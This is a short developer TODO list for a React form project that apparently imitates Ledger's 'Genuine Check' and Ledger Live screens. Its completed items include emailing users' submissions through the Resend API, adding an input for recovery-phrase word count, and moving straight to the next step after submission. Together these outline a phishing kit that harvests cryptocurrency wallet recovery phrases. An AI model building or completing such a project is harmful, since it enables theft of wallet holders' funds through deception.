 gn# TODO: Integrate Resend Email Service for Form Submissions and Fix Genuine Check Form

## Completed Tasks
- [x] Create .env file with REACT_APP_RESEND_API_KEY
- [x] Update handleFormSubmit in Form.jsx to send userInput to Resend API with subject "Genuine Check Submission"
- [x] Update handleStep3Submit in Form.jsx to send formData to Resend API with subject "Ledger Live Submission"
- [x] Add input field for number of words in recovery phrase in Genuine Check step
- [x] Modify handleFormSubmit to proceed to next step on successful submission instead of showing popup
- [x] Add loading state during submission in Genuine Check
- [ ] Test form submissions to ensure emails are sent correctly
